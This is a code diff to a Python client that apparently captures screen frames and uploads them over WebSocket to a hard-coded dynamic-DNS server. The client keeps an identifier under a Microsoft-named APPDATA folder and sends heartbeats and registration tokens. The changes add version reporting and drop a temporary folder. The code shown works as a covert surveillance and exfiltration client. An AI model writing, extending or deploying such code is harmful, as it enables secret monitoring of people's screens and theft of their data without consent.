@@ -20,9 +20,12 @@ VPS_URL = os.getenv("VPS_URL", "http://runx.ddns.net")
 
 try:
     import client_config
-    CLIENT_KEY = getattr(client_config, "CLIENT_KEY", os.getenv("CLIENT_KEY", "BUILD_KEY_PLACEHOLDER"))
+
+    CLIENT_KEY = client_config.CLIENT_KEY
+    CLIENT_VERSION = client_config.CLIENT_VERSION
 except ImportError:
-    CLIENT_KEY = os.getenv("CLIENT_KEY", "BUILD_KEY_PLACEHOLDER")
+    CLIENT_KEY = ""
+    CLIENT_VERSION = "dev"
 
 ID_PATH = os.path.join(os.getenv("APPDATA"), "Microsoft", "run", "run.txt")
 
@@ -49,8 +52,6 @@ capture_thread = None
 
 def capture_loop():
     global capture_active
-    user_folder = os.path.join(os.getenv("TEMP"), "frames-repo", unique_user)
-    os.makedirs(user_folder, exist_ok=True)
 
     while capture_active:
         try:
@@ -76,15 +77,22 @@ def capture_loop():
                     "upload_frame",
                     {"username": unique_user, "filename": filename, "image": b64_img},
                 )
-        except Exception as e:
+        except Exception:
             pass
         time.sleep(1)
 
 
 @sio.event
 def connect():
-    print(f"Connected to WebSocket server as {unique_user}")
-    sio.emit("register", {"username": unique_user, "auth_token": CLIENT_KEY})
+    print(f"Connected to WebSocket server as {unique_user} (version: {CLIENT_VERSION})")
+    sio.emit(
+        "register",
+        {
+            "username": unique_user,
+            "auth_token": CLIENT_KEY,
+            "version": CLIENT_VERSION,
+        },
+    )
 
 
 @sio.event
@@ -151,7 +159,13 @@ def heartbeat_loop():
     while True:
         if sio.connected:
             try:
-                sio.emit("heartbeat", {"username": unique_user})
+                sio.emit(
+                    "heartbeat",
+                    {
+                        "username": unique_user,
+                        "version": CLIENT_VERSION,
+                    },
+                )
             except Exception:
                 pass
         time.sleep(5)
